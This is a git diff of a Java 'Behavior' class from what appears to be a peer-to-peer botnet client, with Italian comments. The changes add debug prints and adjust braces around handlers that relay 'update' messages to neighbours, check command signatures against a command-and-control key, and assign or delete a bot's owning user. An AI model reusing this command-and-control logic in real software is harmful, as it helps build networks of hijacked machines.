@@ -170,14 +170,14 @@ public class Behavior {
 		if (msgs[1].startsWith("update")) {
 			reloadDns();
 			floodNeighoours(rawData, ip);
-		} else {
+		} else 
 			// hai gia ricevuto questo msg? bella domanda
 			if (msgHashList.indexOfValue2(msgs[0]) < 0) {
 				// System.out.println("idHashMessage " + msgs[0]);
 				System.out.println("Nuovo comando da eseguire");
 				// verifica la firma con chiave publica c&c
 				try {
-					System.out.println("signature" + msgs[2]);
+					System.out.println("signature " + msgs[2]);
 					System.err.println("NcommandSize: "+nServ.getCommandConquerIps().getSize());
 				
 					System.out.println("bot ip "+ nServ.getMyIp().toString() );
@@ -211,7 +211,7 @@ public class Behavior {
 			} else {
 				System.out.println("Comando gia eseguito");
 			}
-		}
+		
 	}
 
 	@Async
@@ -257,14 +257,24 @@ public class Behavior {
 			String[] msgs = msg.split("<BU>");
 			String idBot = msgs[1].toString();
 			String idUser = msgs[2].toString();
-			if (nServ.getIdHash().equals(idBot))
+			if (nServ.getIdHash().equals(idBot)){
+				System.out.println("bot impostato: "+idBot);
 				nServ.setIdUser(idUser);
+				System.out.println("setto utente");
+			}
+				
+				
 		}
 		if (msg.startsWith("delbot")) {
+			
 			String[] msgs = msg.split("<BU>");
 			String idUser = msgs[1].toString();
-			if (nServ.getIdUser().equals(idUser))
+			if (nServ.getIdUser().equals(idUser)){
+				System.out.println("utente da cancellare : "+idUser);
 				nServ.setIdUser("");
+				System.out.println("cancello utente");
+			}
+				
 		}
 
 		System.out.println("COMANDO ESEGUTO");
